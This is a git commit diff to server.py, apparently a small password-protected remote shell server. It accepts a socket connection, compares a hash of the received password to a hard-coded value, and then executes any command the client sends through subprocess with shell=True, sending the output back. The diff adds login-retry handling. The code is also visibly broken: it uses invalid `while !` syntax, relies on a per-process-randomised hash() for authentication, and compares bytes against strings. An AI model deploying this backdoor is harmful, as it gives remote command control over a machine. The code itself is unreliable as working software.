9fd5d79bde927a7c4b55069a8188e53e4730f32a
athulnair02 <42418601+athulnair02@users.noreply.github.com>
2023-03-13 13:37:52 -0500

    Update server.py

--- server.py
+++ server.py
@@ -10,6 +10,8 @@ server.bind((HOST, PORT))
 
 
 def login():    
+    print('Server Started')
+    print('Listening for Client Connection...')
     server.listen(1)
     global client, client_addr
     client, client_addr = server.accept()
@@ -17,11 +19,17 @@ def login():
     while True:
             try:                
                 password = client.recv(1024)
+                
+                if (len(password) == 0):
+                    print('Failed Login')
+                    client.close()
+                    return False
+                
                 password.decode()
                 print(password)
                 if hash(password) == 1634504265594755506:
                         print('Login Success')
-                        break
+                        return True
                 else:
                     print('Failed Login')
             except SocketError as se:
@@ -30,35 +38,35 @@ def login():
                 client, client_addr = server.accept()
             except Exception as e:
                 print('Exception', e)
-                pass
 
-print('Server Started')
-print('Listening for Client Connection...')
-
-login()
+login_status = False
+while !login_status:
+    login_status = login()
 
 while True:
     	try:
-            	print('Awaiting Command')
-            	command = client.recv(1024)
-            	command.decode()
+            print('Awaiting Command')
+            command = client.recv(1024)
+            command.decode()
 
-            	if command == 'exit':
-                    	continue
+            if command == 'exit':
+                    continue
 
-            	op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-            	output = op.stdout.read()
-            	output_error = op.stderr.read()
-            	print('Sending Response')
+            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+            output = op.stdout.read()
+            output_error = op.stderr.read()
+            print('Sending Response')
 
-            	#print(output + output_error)
-            	if output + output_error == '':
-                    	client.send('no stdout')
-            	else:
-                    	client.send(output + output_error)
+            #print(output + output_error)
+            if output + output_error == '':
+                    client.send('no stdout')
+            else:
+                    client.send(output + output_error)
     	except Exception as e:
                 print('Main Loop Exception', e)
-                login()
+                login_status = False
+                while !login_status:
+                    login_status = login()
 
 server.close()
 print('Connection Closed')
